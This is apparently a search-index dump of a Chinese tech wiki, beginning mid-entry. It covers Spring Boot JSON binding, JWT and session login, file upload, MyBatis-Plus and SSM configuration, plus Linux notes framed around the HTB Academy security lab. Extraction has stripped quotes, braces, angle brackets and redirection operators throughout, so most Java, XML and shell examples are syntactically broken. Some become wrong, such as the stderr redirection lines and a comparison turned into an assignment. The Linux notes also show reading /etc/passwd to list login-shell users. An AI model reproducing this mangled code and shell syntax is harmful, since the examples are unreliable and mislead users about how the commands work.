带来的字段漂移，并对返回数据进行权限过滤。","tags":[null,null]},{"title":"Java笔记63-SpringBoot返回JSON与参数绑定","path":"/wiki/java/java-note-63.html","content":"Spring MVC 控制器负责把 HTTP 请求映射为方法参数，并把返回值交给视图解析器或消息转换器。 @RestController第一种： @Controller@RequestMapping(/brand)public class BrandController @RequestMapping(/selectAll) @ResponseBody public ListBrand selectAll() return brandService.selectAll(); 第二种： @RestController@RequestMapping(/brand)public class BrandController @GetMapping(/selectAll) public ListBrand selectAll() return brandService.selectAll(); 写法 适用场景 @Controller + @ResponseBody 既可能返回页面，也可能返回 JSON @RestController 整个类都以 JSON 文本响应为主 @RestController 等价于类级 @Controller 与 @ResponseBody，适合所有处理方法都写入响应体的控制器。 JSON 消息转换方法返回 ListBrand 时，浏览器最终收到的是 JSON 字符串，而不是 Java 对象本身。中间起作用的是 Spring MVC 的 HttpMessageConverter，常见情况下会使用 Jackson 把 Java 对象序列化成 JSON。 这能解释两个常见现象： 返回对象字段会变成 JSON 属性 日期格式、空值、字段名风格都可能受到序列化配置影响 序列化结果还受媒体类型协商、Jackson 配置和字段可见性影响。实体对象若包含密码、内部状态或双向关联，不应直接作为响应 DTO。 参数绑定 方式 用法 适用场景 普通同名参数 String name 简单表单、查询参数 @RequestParam @RequestParam(id) Integer id 参数名不一致、需要默认值 @PathVariable @PathVariable Integer id REST 风格路径参数 JavaBean 对象接收 User user 表单字段较多 @RequestBody @RequestBody User user 接 JSON 请求体 例如： @GetMapping(/id)public Brand getById(@PathVariable Integer id) return brandService.getById(id); 或者： @PostMapping(/login)public Result login(@Valid @RequestBody LoginRequest request) return userService.login(request); @RequestBody 和普通 JavaBean 参数的差别尤其重要。普通 JavaBean 参数更常接收表单或查询参数，@RequestBody 则从请求体读取 JSON，再反序列化成对象。如果前端以 JSON 提交，却没有写 @RequestBody，后端经常会出现对象字段全是 null 的问题。 统一响应结构直接返回 ListBrand 没问题，但项目一旦变复杂，很快就会遇到下面几个问题： 如何同时返回状态码、消息和数据 如何表达校验失败 如何承载分页总数 这时就会出现统一结果体的设计，例如： public class ResultT private Integer code; private String msg; private T data; 或者分页场景中的： public class PageResultT private Integer code; private String msg; private Integer count; private ListT data; 统一业务响应结构不能替代 HTTP 状态码。认证失败、参数错误、资源不存在和服务器异常仍应返回对应状态，并由全局异常处理统一转换。 参数校验分页页码、用户名和状态值应在 DTO 上声明约束，并使用 @Valid 或 @Validated 触发校验。业务存在性、唯一性和权限规则仍由 Service 与数据库约束处理。 接口约定 观察点 要看什么 路径 接口 URL 是否清晰 参数 是表单、查询参数还是 JSON 方法类型 GET POST PUT DELETE 是否符合语义 返回值 是直接对象，还是统一结果体 修改类接口还要处理幂等性、并发更新和 CSRF 或令牌认证，不能只依靠参数绑定成功判断请求有效。","tags":[null,null]},{"title":"Java笔记66-SpringBoot登录认证、拦截器与JWT","path":"/wiki/java/java-note-66.html","content":"登录认证需要同时处理身份校验、状态保存和后续请求的凭证验证。Session 将状态保存在服务端；JWT 将声明编码进令牌并用签名校验完整性，两者的失效、撤销和存储边界不同。 Session 登录态传统 Web 项目里，登录成功后最常见的做法是把当前用户放进 Session： session.setAttribute(currentUser, user); 然后在拦截器里统一校验： public boolean preHandle(HttpServletRequest request,HttpServletResponse response,Object handler) throws Exception HttpSession session = request.getSession(false); Object currentUser = (session != null) ? session.getAttribute(currentUser) : null; if (currentUser != null) return true; response.sendRedirect(request.getContextPath() + /auth/login); return false; Session 适合服务器渲染页面和需要服务端主动撤销登录态的系统。 多实例部署可以使用集中式 Session 存储；Token 方案也需要处理密钥分发、撤销、刷新和客户端安全存储，并不天然更简单。 Token 与 JWTToken 是广义概念，JWT 是一种具体实现形式。 概念 含义 Token 令牌，代表某种认证凭证 JWT 一种结构化 Token，包含头、载荷、签名 JWT 把声明编码进令牌，并通过签名验证完整性与签发方；签名不提供保密性。 JWT 通常由三部分组成： Header.Payload.Signature Header 描述算法和类型，Payload 放声明信息，Signature 用密钥对前两部分签名。签名能证明内容没有被篡改，但并不代表 Payload 是加密的。因此 JWT 里不应该放密码、身份证号、密钥这类敏感信息。 JWT 登录接口@PostMapping(/login)public Result login(@Valid @RequestBody LoginRequest request) User loginUser = userService.login(request); if (loginUser == null) return Result.error(用户名或密码错误); MapString, Object claims = new HashMap(); claims.put(id, loginUser.getId()); claims.put(name, loginUser.getName()); String token = JwtUtil.createToken(claims); return Result.ok(登录成功, token); 工具类需要遵守两个边界： token 内只放必要身份信息 签名密钥绝不直接暴露真实值 $... 只有在 Spring 管理的配置注入位置才会被解析；写进普通 static final 字段只会得到字面字符串。可以通过构造方法注入配置： @Componentpublic class JwtUtil private final String secret; public JwtUtil(@Value($jwt.secret) String secret) this.secret = secret; 生产环境的密钥应由环境变量或密钥管理服务提供，并满足所选签名算法的长度要求。验证端必须固定允许的算法，不能信任令牌头自行选择算法；密钥轮换可通过密钥标识配合受控密钥集合完成。 认证安全边界 密码不能明文比较，应该做哈希 token 需要验证过期时间、签发者和受众 缺失、失效或过期凭证统一返回 401 刷新 token、退出登录、黑名单机制要按业务选择 认证成功后仍要进行资源授权；JWT 中携带角色也不能替代服务端对当前权限和资源归属的判断。 从请求头提取令牌前后端分离项目里，Token 常见放法是： Authorization: Bearer token 过滤器读取请求头后，校验签名、算法、过期时间、签发者、受众和必要声明，再把最小身份信息放入当前请求安全上下文。凭证有效但权限不足时返回 403 Forbidden，而不是 401。 Session 与 JWT 的适用场景 约束 可考虑的方案 服务端页面、需要即时撤销 Session 或不透明 Token 跨服务验证、可接受短期失效窗 短生命周期 JWT 高价值操作、权限频繁变化 服务端状态校验或短令牌配合撤销机制 浏览器中的令牌存储还要评估 XSS 与 CSRF：可被 JavaScript 读取的存储受 XSS 影响，Cookie 自动携带则需要 HttpOnly、Secure、SameSite 和 CSRF 防护。不存在对所有架构都安全的固定存放位置。","tags":[null,null]},{"title":"Java笔记68-SSM容器启动与请求入口","path":"/wiki/java/java-note-68.html","content":"版本边界： 以下 SSM 示例基于 web.xml、XML 容器配置与 JSP 的传统部署方式。使用 Spring 6 或 Jakarta EE 9+ 时，应同步核对 JDK、Spring、Servlet API、Tomcat 与 MyBatis-Spring 的兼容矩阵。 Servlet 容器读取 web.xml 后分别创建 Spring 根容器和 Spring MVC 子容器，请求再由 DispatcherServlet 分派到 Controller。 传统 SSM 的 web.xml 入口web.xml 先声明 Spring 根容器： listener listener-classorg.springframework.web.context.ContextLoaderListener/listener-class/listenercontext-param param-namecontextConfigLocation/param-name param-valueclasspath:applicationContext.xml/param-value/context-param 随后声明 Spring MVC 前端控制器： servlet servlet-namespringmvc/servlet-name servlet-classorg.springframework.web.servlet.DispatcherServlet/servlet-class init-param param-namecontextConfigLocation/param-name param-valueclasspath:springmvc.xml/param-value /init-param/servlet 还应配置 servlet-mapping 和适当的 load-on-startup，使 DispatcherServlet 接收目标 URL 并在预期时机初始化。 容器启动顺序与 Bean 可见性传统 SSM 项目部署到 Tomcat 后，Tomcat 会先读取 web.xml。ContextLoaderListener 通常先创建 Spring 根容器，加载 Service、Mapper、数据源、事务等基础 Bean；随后 DispatcherServlet 创建 Spring MVC 容器，加载 Controller、视图解析器、拦截器等 Web 组件。 可以把顺序简化成： Tomcat 启动 Web 应用- 读取 web.xml- ContextLoaderListener 创建根容器- DispatcherServlet 创建 MVC 容器- 请求进入 DispatcherServlet MVC 子容器可以访问父容器中的 Service Bean。根容器不能看到只存在于子容器的 Controller，也不应依赖 Web 层。 根容器与 MVC 容器 容器 主要负责什么 Spring 根容器 Service、Mapper、数据源、事务等基础能力 Spring MVC 容器 Controller、视图解析、参数绑定、拦截器等 Web 能力 两个容器应使用不同组件扫描范围，避免重复注册 Service 或 Controller。 DispatcherServlet映射到 DispatcherServlet 的请求会先进入 Spring MVC 前端控制器： 浏览器请求- DispatcherServlet- 找到对应 Controller- 调 Service- 返回视图或 JSON HandlerMapping 定位处理方法，HandlerAdapter 完成参数解析并调用方法，返回值再进入视图解析器或消息转换器。Filter 在 Servlet 调用链中执行，Spring MVC Interceptor 则围绕处理器调用执行。 springmvc.xml 的 Web 层规则context:component-scan base-package=com.java.controller/mvc:annotation-driven/mvc:resources mapping=/static/** location=/static// 以及视图解析器： bean class=org.springframework.web.servlet.view.InternalResourceViewResolver property name=prefix value=// property name=suffix value=.jsp//bean 该配置决定： Controller 从哪里扫 注解驱动是否开启 JSP 如何解析 静态资源是否放行 拦截器是否接入","tags":[null,null]},{"title":"Java笔记67-SpringBoot整合MyBatis-Plus","path":"/wiki/java/java-note-67.html","content":"版本边界： MyBatis-Plus 的 Spring Boot Starter、分页插件类和附加依赖会随版本变化，应按所用 Spring Boot 与 MyBatis-Plus 版本的官方安装文档配置。 MyBatis-Plus 在 MyBatis 之上提供单表 CRUD、条件构造器、分页和字段填充等能力，复杂 SQL 仍可使用 Mapper XML 或注解实现。 MyBatis-Plus 的重复代码治理原生 MyBatis 的常见结构如下： public interface BrandMapper ListBrand selectAll(); mapper namespace=com.java.springboot.mapper.BrandMapper select id=selectAll resultType=Brand SELECT * FROM tb_brand /select/mapper 每个实体重复编写结构相同的单表 CRUD 时，可以由通用 Mapper 接口接管。 BaseMapperT最小定义通常是： public interface UserMapper extends BaseMapperUser 继承 BaseMapperT 后即可获得单表常用 CRUD 方法；符合映射约定的基础操作可以不再编写 XML。 实体与表的映射约定MyBatis-Plus 能直接提供 insert、selectById、updateById、deleteById 等方法，前提是它能根据实体类、主键、字段名和表名推导出对应 SQL。这些方法依赖以下映射约定： 实体类对应数据库表 主键字段有明确标识 字段名和列名能按规则映射 单表 CRUD 的 SQL 结构相对稳定 表名、主键或字段不符合默认约定时，应使用对应映射注解显式声明。多表和统计查询通常仍使用明确 SQL。 分页插件@Beanpublic MybatisPlusInterceptor mybatisPlusInterceptor() MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor(); interceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.MYSQL)); return interceptor; 然后业务里就可以直接分页查询： PageUser page = new Page(1, 10);PageUser result = userMapper.selectPage(page, wrapper); wrapper 用于组合等值、模糊搜索和排序条件。来自请求的列名不能直接进入动态排序；应映射到允许字段，复杂查询则保留明确 SQL。 自动填充与逻辑删除 功能 典型用途 自动填充 新增、修改时自动维护时间字段 逻辑删除 更新删除标记，默认查询过滤已删除记录 主键策略 自增、雪花算法、UUID 等 逻辑删除会更新删除标记，并让框架生成的常规查询过滤已删除记录；自定义 SQL、唯一索引、关联查询和历史统计仍需显式考虑该字段。逻辑删除也不等同于完整审计记录。 MyBatis-Plus 的适用边界虽然 MyBatis-Plus 很方便，但它并不意味着 XML 可以完全消失。下面这些场景依然经常会回到原生 MyBatis： 多表联查很复杂 统计 SQL 较多 业务查询高度定制化 需要对 SQL 保持极强控制力 批量操作、乐观锁、自动填充和分页插件都需要单独配置和测试，不能从继承 BaseMapper 推断它们已经自动生效。","tags":[null,null,null]},{"title":"Java笔记65-SpringBoot文件上传与静态资源映射","path":"/wiki/java/java-note-65.html","content":"文件上传需要同时处理请求大小、内容校验、文件命名、保存目录、覆盖策略、访问控制和生命周期管理。 MultipartFile 参数绑定最基本的上传控制器通常会长这样： @RestControllerpublic class UploadController private static final SetString ALLOWED_EXTENSIONS = Set.of(.jpg, .jpeg, .png, .webp); @PostMapping(/upload) public Result uploadImage(@RequestParam MultipartFile file) throws IOException if (file.isEmpty()) return Result.error(文件为空); String uuid = UUID.randomUUID().toString().replace(-, ); String originalName = file.getOriginalFilename(); String extension = getAllowedExtension(originalName); String newFilename = uuid + extension; Path uploadDir = Paths.get(upload-dir).toAbsolutePath().normalize(); Files.createDirectories(uploadDir); Path target = uploadDir.resolve(newFilename).normalize(); if (!target.startsWith(uploadDir)) throw new IOException(非法文件路径); try (InputStream input = file.getInputStream()) Files.copy(input, target); return Result.ok(上传成功, newFilename); private String getAllowedExtension(String originalName) if (originalName == null || originalName.isBlank()) throw new IllegalArgumentException(文件名不能为空); int dotIndex = originalName.lastIndexOf(.); if (dotIndex = 0 || dotIndex == originalName.length() - 1) throw new IllegalArgumentException(文件缺少有效扩展名); String extension = originalName.substring(dotIndex).toLowerCase(Locale.ROOT); if (!ALLOWED_EXTENSIONS.contains(extension)) throw new IllegalArgumentException(不支持的文件类型); return extension; 上传处理至少包含以下动作： 接收上传内容 重新命名文件 保存并返回访问所需的信息 MultipartFile 是 Spring MVC 对 multipart/form-data 请求中单个部件的封装。getAllowedExtension 会拒绝空文件名、无扩展名文件和白名单以外的类型，并把扩展名统一为小写。这里只允许 JPEG、PNG 和 WebP 图片；扩展名白名单仍需与内容类型、文件签名等校验配合使用。 文件名生成如果直接使用原文件名，常见问题会非常多： 不同用户上传同名文件会互相覆盖 文件名里可能带空格、中文或特殊字符 前端恶意构造路径会增加风险 服务器端命名方式包括： 方案 说明 UUID + 原扩展名 最常见，也最实用 时间戳 + 随机串 简单直观 内容哈希命名 适合去重场景 静态资源映射文件上传后经常会遇到一个典型问题：文件已经保存到了磁盘，但浏览器却访问不到。原因通常是“磁盘目录”和“Web 可访问路径”是两回事。 这时就需要静态资源映射： @Configurationpublic class WebConfig implements WebMvcConfigurer @Override public void addResourceHandlers(ResourceHandlerRegistry registry) registry.addResourceHandler(/files/**) .addResourceLocations(file:/upload-dir/); 资源映射会让目录中的文件可通过 URL 访问，但它本身不提供鉴权、病毒扫描或内容安全隔离。用户上传的 HTML、SVG 等主动内容若与主站同源公开，可能带来 XSS 风险。 保存路径与访问路径文件保存路径通常是服务器磁盘路径，例如 /data/uploads/avatar.png；访问路径则是浏览器能请求的 URL，例如 /files/avatar.png。二者不是同一个概念，中间需要静态资源映射建立关系。 这种分离有两个好处：一方面，真实磁盘目录不需要直接暴露给前端；另一方面，后续迁移到对象存储、CDN 或独立文件服务器时，对外访问路径也更容易统一。 外部化上传目录“本地磁盘目录直接写死”这种做法，只适合本机实验，不适合直接进入项目代码。更合理的配置通常有两种： app.upload.dir=/data/uploads 或者： app.upload.dir=$UPLOAD_DIR 上传目录属于运行环境信息，应使用类型安全配置读取，并在启动时验证目录可写。多实例部署不能默认共享本地磁盘，通常需要共享文件服务或对象存储。 上传大小限制Spring Boot 可以配置单文件和整次请求的大小上限： spring.servlet.multipart.max-file-size=10MBspring.servlet.multipart.max-request-size=10MB 超过限制时通常会抛出 multipart 大小异常，应由异常处理器转换为稳定的 4xx 响应： Maximum upload size exceeded 文件上传安全文件上传不能只写到保存文件，真实项目至少还要考虑几类校验： 文件大小是否超过限制 扩展名和实际内容类型是否匹配 是否允许上传可执行脚本 原始文件名中是否带路径穿越字符 保存失败时是否会留下半成品文件 扩展名、请求声明的 Content-Type 和文件签名都不能单独证明内容安全。高风险场景还需要病毒扫描、图片重编码、下载时设置 Content-Disposition 和 X-Content-Type-Options: nosniff，并把公开文件与应用执行目录隔离。","tags":[null,null]},{"title":"Linux 系统组成、发行版与目录层次","path":"/wiki/linux/linux-01-system-structure.html","content":"Linux 严格来说是操作系统内核。日常所说的 Ubuntu、Debian、Fedora 或 Parrot OS，则是在 Linux 内核之外组合了 GNU 工具、系统库、初始化系统、软件包管理器和应用程序的完整发行版。 HTB Academy 的 Pwnbox 使用预装安全工具的 Parrot OS。它提供的是 Linux 用户空间环境，Shell 命令最终仍通过系统调用请求内核管理进程、内存、文件系统和网络设备。 从 Unix、GNU 到 LinuxUnix 的早期开发始于 1969 年前后的贝尔实验室。GNU 项目于 1983 年启动，逐步提供编译器、Shell 和大量用户空间工具。Linus Torvalds 在 1991 年发布 Linux 内核的早期版本，GNU 工具与 Linux 内核随后成为许多自由操作系统发行版的基础。 BSD、GNULinux 和其他 Unix-like 系统共享许多接口和使用习惯，但它们的内核、许可证、用户空间实现和系统管理方式并不相同。 内核空间与用户空间Linux 系统可以按权限边界分为内核空间和用户空间： 组成 职责 硬件 CPU、内存、存储设备、网卡和外围设备 Linux 内核 进程调度、虚拟内存、设备驱动、文件系统、网络协议栈和访问控制 系统调用接口 用户程序请求内核服务的受控入口 系统库与工具 封装系统调用并提供命令、运行库和管理功能 Shell 与图形环境 接收用户操作并启动程序 应用程序 在用户空间中完成具体任务 普通程序不能直接读写任意物理内存或设备寄存器。内核通过虚拟地址空间、权限检查和资源调度隔离进程，并向程序提供稳定接口。 启动与用户环境组件 Bootloader：加载内核和初始内存文件系统，GRUB 是常见实现。 Kernel：初始化硬件并提供进程、内存、存储和网络管理。 Init system：启动用户空间服务并管理系统状态，许多现代发行版使用 systemd。 Daemon：在后台提供日志、网络、调度等服务，通常由服务管理器启动和监控。 Shell：解释命令、展开参数、建立重定向和管道，再启动相应程序。 Display server 或 compositor：组织图形应用的显示与输入；X.Org 和 Wayland 生态采用不同模型。 Desktop environment window manager：提供窗口管理、面板、文件管理器等桌面功能。 Unix 风格接口“一切皆文件”描述的是 Unix 倾向于使用文件描述符和字节流统一 IO 接口。普通文件、终端、管道、Socket 和部分设备都可以通过相似的 read、write、close 接口操作。 这不是说所有系统对象都真实存储为磁盘文件。进程本身不是文件，网络连接也不是目录中的普通文件；/proc、/sys 和设备文件只是内核向用户空间暴露状态或操作入口的特殊文件系统接口。 小型单用途工具、可组合的数据流和文本配置也是 Unix 工具链的常见设计方式。它们是工程习惯，不是每个 Linux 组件都必须遵守的绝对规则。 发行版的差异发行版通常在以下方面不同： 软件包格式与仓库，例如 Debian 系的 .debAPT 和 Fedora 系的 RPMDNF； 默认桌面、服务和安全策略； 发布周期、支持期限与软件版本新旧； 安装器、配置工具和目标使用场景。 Parrot OS、Kali Linux 等安全发行版预装大量测试工具，但工具是否存在不改变 Linux 权限和网络机制。生产系统也不应仅因发行版名称被视为安全，补丁、服务暴露、凭据和配置仍决定实际风险。 文件系统层次文件系统层次标准（FHS）定义了常见目录的用途： 路径 常见内容 / 根文件系统和其他挂载点的入口 /boot 内核、initramfs 和引导相关文件 /dev 由内核和设备管理器提供的设备节点 /etc 主机级系统配置 /home 普通用户的主目录 /root root 用户的主目录 /run 本次启动期间的运行状态数据 /tmp 临时文件，清理策略由系统配置决定 /usr 主要用户空间程序、库、共享数据和手册 /var 日志、缓存、队列和其他持续变化的数据 /opt 可选的第三方软件包 /mnt 管理员临时挂载文件系统的位置 /media 可移动介质的常见挂载位置 现代发行版常采用 usrmerge，使 /bin、/sbin、/lib 成为 /usr 下对应目录的符号链接。脚本不应依赖它们一定是独立文件系统。 参考资料 Linux Kernel Documentation Filesystem Hierarchy Standard 3.0 Debian Reference","tags":[null,null,null]},{"title":"Linux","path":"/wiki/linux/index.html","content":"Linux 系统结构、Shell、文件管理与系统管理知识。"},{"title":"Java笔记69-SSM数据源、MyBatis与Mapper扫描","path":"/wiki/java/java-note-69.html","content":"SSM 数据层由 Spring 数据源、MyBatis SqlSessionFactory、Mapper 代理和 Spring 事务管理器组成。 applicationContext.xml 配置顺序配置依赖顺序如下： 先读取数据库配置 再创建数据源 再创建 SqlSessionFactory 再扫描 Mapper 最后把事务接上 对应配置大致像这样： context:property-placeholder location=classpath:db.properties/bean id=dataSource class=com.mchange.v2.c3p0.ComboPooledDataSource property name=driverClass value=$jdbc.driver/ property name=jdbcUrl value=$jdbc.url/ property name=user value=$jdbc.username/ property name=password value=$jdbc.password//bean 配置示例可以保留成这种形式： jdbc.driver=com.mysql.cj.jdbc.Driverjdbc.url=jdbc:mysql://db-host:db-port/db-namejdbc.username=db-usernamejdbc.password=db-password 数据源提供数据库连接，连接池负责复用连接并限制容量。事务管理器与 SqlSessionFactoryBean 必须引用同一数据源，才能让 Mapper 调用参与同一 Spring 事务。连接池实现和属性需要按实际版本配置。 SqlSessionFactoryBeanbean id=sqlSessionFactory class=org.mybatis.spring.SqlSessionFactoryBean property name=configLocation value=classpath:mybatis.xml/ property name=mapperLocations value=classpath:mapper/*.xml/ property name=dataSource ref=dataSource//bean 该 Bean 声明三项依赖： 问题 对应配置 MyBatis 核心配置文件在哪里 configLocation Mapper XML 从哪里加载 mapperLocations 数据库连接由谁提供 dataSource Mapper 代理注册bean class=org.mybatis.spring.mapper.MapperScannerConfigurer property name=basePackage value=com.java.mapper/ property name=sqlSessionFactoryBeanName value=sqlSessionFactory//bean 它会扫描指定包下的 Mapper 接口，并为这些接口生成代理对象，再把它们注册进 Spring 容器。 MapperScannerConfigurer 是 BeanDefinitionRegistryPostProcessor，较早参与容器启动；使用 sqlSessionFactoryBeanName 通过名称关联工厂，避免在后处理阶段过早解析普通 Bean 引用。 Service 注入的是 MyBatis-Spring 创建的 Mapper 代理。代理通过与 Spring 事务同步的 SqlSession 执行 SQL，调用方不应手工长期保存 SqlSession。 mybatis.xml 的映射规则settings setting name=logImpl value=STDOUT_LOGGING/ setting name=mapUnderscoreToCamelCase value=true//settingstypeAliases package name=com.java.pojo//typeAliases STDOUT_LOGGING 适合临时排查，不适合作为生产日志方案；生产环境应接入统一日志框架并避免输出敏感 SQL 参数。","tags":[null,null]},{"title":"Java笔记71-SSM登录拦截与Session校验","path":"/wiki/java/java-note-71.html","content":"SSM 页面应用可以在登录成功后建立 Session，由 Spring MVC 拦截器检查认证状态，并在资料更新后刷新会话中的展示信息。 登录校验与会话建立@PostMapping(/login)public String doLogin(@RequestParam String username,@RequestParam String password,Model model,HttpSession session) User user = userService.login(username, password); if (user == null) model.addAttribute(error, 用户名或密码错误); return login; session.setAttribute(currentUser, user); return redirect:/index.jsp; 该方法校验身份并建立登录态。 Session 只应保存不含密码的最小认证主体。登录成功后应更新会话标识，Cookie 应设置 HttpOnly、Secure 和合适的 SameSite 属性。 Spring MVC 拦截器public class LoginInterceptor implements HandlerInterceptor @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception HttpSession session = request.getSession(false); User user = (session != null) ? (User) session.getAttribute(currentUser) : null; if (user != null) return true; response.sendRedirect(request.getContextPath() + /user/login); return false; 拦截器围绕 Spring MVC 处理器执行，适合检查 Controller 请求的认证状态。 Filter 属于 Servlet 规范，可以覆盖进入容器的更广请求范围；Interceptor 只覆盖 Spring MVC 处理器。安全响应头、跨 Servlet 认证或容器级规则更适合 Filter，Controller 路径规则可由 Interceptor 处理。 拦截器放行路径mvc:interceptors mvc:interceptor mvc:mapping path=/**/ mvc:exclude-mapping path=/user/login/ mvc:exclude-mapping path=/user/register/ mvc:exclude-mapping path=/static/**/ bean class=com.java.interceptor.LoginInterceptor/ /mvc:interceptor/mvc:interceptors 公开路径列表需要包含登录、注册和必要静态资源，同时避免用宽泛前缀意外放行受保护端点。 Session 还存在会话固定风险。登录成功后应更新会话标识；退出登录时除了页面跳转，还应使会话失效并清理相关数据。 资料修改后的 Session 同步@PostMapping(/profile)public String updateProfile(User user, Model model, HttpSession session) userService.updateUser(user); session.setAttribute(currentUser, userService.getUserById(user.getId())); model.addAttribute(msg, 更新成功); return profile; 更新请求应从当前认证主体取得用户 ID，不能信任表单提交的 user.id。Service 只允许修改授权字段，再重新读取不含密码的用户信息更新 Session。角色和权限变化应由服务端权威数据决定，不能仅依赖会话中的旧值。 访问控制边界登录流程、Session 方案思路、拦截器配置方式、路径排除规则、资料更新后同步 Session，这几部分共同组成了 SSM 页面型项目里的访问控制主线。 Session 中存在认证主体只表示用户已登录。接口仍需校验角色、资源归属和操作权限；状态修改请求还应有 CSRF 防护，退出登录应使 Session 失效。","tags":[null,null]},{"title":"Java笔记70-SSM事务管理与分页查询","path":"/wiki/java/java-note-70.html","content":"SSM 事务通常围绕 Service 业务动作建立，并通过 Spring 代理连接同一数据源上的多个 Mapper 调用。 Service 层事务边界从职责上看，事务最适合围住“一个完整业务动作”。而业务动作最自然的落点，就是 Service 层。 @Servicepublic class OrderServiceImp implements OrderService @Override @Transactional public int placeOrder(Integer userId, Integer itemId) Order order = new Order(); order.setUserId(userId); order.setBookId(itemId); order.setStatus(PENDING); return orderMapper.insert(order); 单次插入已经可以使用事务；当业务扩展为订单、明细和库存等多次写入时，同一 Service 方法应使它们共同提交或回滚。 XML 事务与 @Transactionaltx:advice id=txAdvice transaction-manager=transactionManager tx:attributes tx:method name=select* propagation=SUPPORTS read-only=true/ tx:method name=find* propagation=SUPPORTS read-only=true/ tx:method name=update* propagation=REQUIRED/ tx:method name=delete* propagation=REQUIRED/ /tx:attributes/tx:advice @Transactionalpublic int update(Book book) return bookMapper.update(book); 方式 特点 XML 声明式事务 规则集中、适合统一约束 @Transactional 更贴近具体业务方法 XML 方式可按方法命名集中配置事务，注解方式则在具体业务方法上声明。两种规则若同时匹配同一方法，应明确最终事务属性，避免实际语义无法判断。 传播与回滚规则propagation=REQUIRED 表示当前没有事务就新建一个，有事务就加入当前事务；SUPPORTS 表示有事务就加入，没有事务也可以执行。查询方法常用 SUPPORTS 和 read-only=true，写方法常用 REQUIRED。 Spring 默认通常对未捕获的运行时异常和 Error 回滚；受检异常需按业务配置 rollbackFor 等规则。捕获异常后吞掉或只返回错误码不会自动触发回滚。类内部自调用和非容器对象也可能绕过事务代理。 分页查询的服务层职责public ListBook findPage(int page, int size) int offset = (page - 1) * size; return bookMapper.findPage(offset, size); Service 可以统一校验页码、页大小并计算偏移量，避免不同 Controller 使用不同规则。 分页查询是否使用事务取决于一致性要求。数据查询和总数查询是两条 SQL，并发写入时结果可能不在同一快照；固定排序和页大小上限则始终需要。 PageHelperPageHelper.startPage(page, size);ListBook list = bookMapper.search(title, author);PageInfoBook pi = new PageInfo(list);return new PageResult((int) pi.getTotal(), pi.getList()); PageHelper.startPage 使用线程上下文影响紧随其后的 Mapper 查询，调用顺序和异常清理必须按所用版本验证。getTotal() 返回 long，不应在总量可能较大时直接强转为 int。","tags":[null,null]},{"title":"Linux Shell、终端与命令帮助","path":"/wiki/linux/linux-02-shell-and-help.html","content":"终端、Shell 和控制台经常被混用，但它们位于不同层次。终端模拟器负责显示字符并传递键盘输入，Shell 负责解析命令，控制台则通常指系统提供的本地文本会话。 终端与 ShellGNOME Terminal、Windows Terminal 和 Konsole 都是终端模拟器。它们可以启动 Bash、Zsh、Fish 等 Shell，也可以承载 SSH、文本编辑器和交互式程序。 Shell 收到一行命令后，会依次处理变量展开、通配符、命令替换、重定向和管道，再执行内建命令或启动外部程序。图形界面与 Shell 都能请求系统功能，但二者不是相互包含的替代实现。 Bash 是许多 Linux 发行版常见的交互式 Shell，系统默认值仍以 /etc/passwd 中的登录 Shell 和用户配置为准。 提示符信息常见 Bash 提示符形如： user@host:~/project$ 其中包含用户名、主机名和当前工作目录。~ 是当前用户主目录的 Shell 展开形式。普通用户常以 $ 结尾，root 常以 # 结尾，但提示符可以自定义，字符本身不能作为权限判断依据。 PS1 控制主要交互提示符，例如： PS1=\\u@\\h:\\w\\$ 转义 内容 \\u 当前用户名 \\h \\H 短主机名 完整主机名 \\w 当前工作目录 \\d 日期 \\t 24 小时时间 \\j 当前 Shell 管理的作业数量 换行 临时赋值只影响当前 Shell。要持久化配置，可以写入用户的 ~/.bashrc，并注意转义序列与颜色控制符不能破坏终端对提示符长度的计算。 判断命令来自哪里同一个名称可能是别名、函数、Shell 内建命令或外部可执行文件。type 能显示 Bash 实际会执行的对象： type cdtype lstype -a python3command -V grep which 通常只在 PATH 中查找可执行文件，不能完整反映别名、函数和内建命令，因此排查命令解析时以 type 或 command -V 更准确。 获取命令帮助不同帮助入口覆盖范围不同： 方式 适用对象 help cd Bash 内建命令 command --help 程序提供的简要参数说明 man command 系统安装的手册页 info command GNU Info 文档 apropos keyword 按手册描述搜索命令 man -k keyword 与 apropos 类似 whatis command 显示手册页的一行描述 手册页编号表示文档类别。例如 printf(1) 是用户命令，printf(3) 是 C 库函数。可以显式指定章节： man 1 printfman 3 printf 某些程序没有实现 -h 或 --help，也可能使用自己的子命令帮助格式。帮助参数不是 Shell 的统一规则。 命令历史与会话记录Bash 历史通常保存在 ~/.bash_history，但写入时机、保存数量和忽略规则受 HISTFILE、HISTSIZE、HISTCONTROL 等变量影响。多个并发 Shell 也可能覆盖或合并历史，因此它不能作为完整审计日志。 script 可以记录终端会话的输入和输出： script session.typescript# 执行操作exit 会话记录和历史文件可能包含密码、令牌、目标地址和敏感输出，发布或共享前需要按实际授权范围检查。 参考资料 Bash Reference Manual Linux man-pages","tags":[null,null,null]},{"title":"Linux 文件检索、重定向与文本处理","path":"/wiki/linux/linux-05-find-redirection-text-processing.html","content":"Linux 命令行工具通常通过标准输入读取字节流，并把结果写入标准输出。文件检索、重定向和文本处理可以由此组合成一条流水线。 查找命令与文件type 和 command -V 用于确认 Shell 会执行哪个命令；find 遍历实时目录树；locate 查询预先建立的路径数据库。 type -a python3find /etc -type f -name *.conf 2/dev/nullfind . -type f -mtime -7 -size +1Mlocate sshd_config find 的测试条件默认通过逻辑与连接。涉及删除或执行时，可以先只打印匹配项，再增加 -delete 或 -exec。locate 速度快，但数据库可能尚未包含刚创建的文件，也可能受权限过滤和更新周期影响。 标准流与文件描述符进程启动时通常拥有三个文件描述符： 编号 名称 默认连接 0 stdin 终端输入 1 stdout 终端输出 2 stderr 终端错误输出 command stdout.txtcommand 2stderr.txtcommand all.txt 21command history.logcommand input.txt 重定向按从左到右的顺序建立。all.txt 21 让两个流写入同一文件；21 all.txt 则让标准错误继续指向重定向前的标准输出。 管道与 teecat /etc/passwd | grep /bin/bashgrep /bin/bash /etc/passwd | cut -d: -f1command | tee result.txt | wc -l 管道只连接左侧标准输出和右侧标准输入，标准错误不会自动进入管道。许多命令可以直接接收文件参数，因此 grep pattern file 比 cat file | grep pattern 少启动一个进程；当 cat 负责合并多个文件或提供特殊输入时，管道写法仍有用途。 常用文本工具 工具 作用 less 分页查看文本，退出后是否保留屏幕取决于终端和参数 head tail 读取开头或末尾，默认 10 行 sort 按指定规则排序行 cut 按字符位置或分隔字段选取内容 tr 转换或删除单字节字符集合 column 按列整理显示 awk 按记录和字段处理文本 sed 